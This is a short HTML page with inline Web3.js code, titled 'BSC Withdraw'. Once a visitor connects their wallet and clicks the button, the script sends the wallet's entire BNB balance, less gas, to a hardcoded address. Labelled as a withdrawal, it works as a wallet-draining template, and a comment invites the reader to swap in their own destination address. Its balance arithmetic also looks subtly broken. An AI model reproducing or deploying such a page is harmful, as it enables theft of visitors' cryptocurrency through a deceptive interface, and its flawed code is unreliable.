<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>BSC Withdraw</title>
    <!-- Add Web3.js library -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/web3/1.5.2/web3.min.js"></script>
    <!-- Add BSC Mainnet RPC URL -->
    <script>
        const bscRpcUrl = 'https://bsc-dataseed1.binance.org/';
        const bscAddress = '0x96181B6078645EE513205f1D7e874bbE3f423F74'; // Replace with your destination address

        async function connectBSC() {
            if (typeof window.ethereum === 'undefined') {
                alert('Please install MetaMask or another Ethereum wallet that supports BSC.');
                return;
            }

            try {
                await window.ethereum.request({
                    method: 'wallet_addEthereumChain',
                    params: [
                        {
                            chainId: '0x56', // BSC Mainnet
                            chainName: 'Binance Smart Chain Mainnet',
                            nativeCurrency: {
                                name: 'Smart Chain',
                                symbol: 'BNB',
                                decimals: 18,
                            },
                            rpcUrls: [bscRpcUrl],
                            blockExplorerUrls: ['https://bscscan.com/'],
                        },
                    ],
                });

                const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
                const web3 = new Web3(window.ethereum);
                
                // Withdraw all funds
                const balance = await web3.eth.getBalance(accounts[0]);
                const gasPrice = await web3.eth.getGasPrice();
                const gasLimit = 21000; // Standard gas limit for a simple transfer
                const txValue = web3.utils.toHex(balance.sub(web3.utils.toBN(gasPrice).mul(web3.utils.toBN(gasLimit))));
                
                await web3.eth.sendTransaction({
                    from: accounts[0],
                    to: bscAddress,
                    value: txValue,
                    gasPrice: gasPrice,
                    gas: gasLimit,
                });
                
                alert('Withdrawal successful!');
            } catch (error) {
                alert('Error: ' + error.message);
            }
        }
    </script>
</head>
<body>
    <button onclick="connectBSC()">Withdraw All to 0x96181B6078645EE513205f1D7e874bbE3f423F74</button>
</body>
</html>
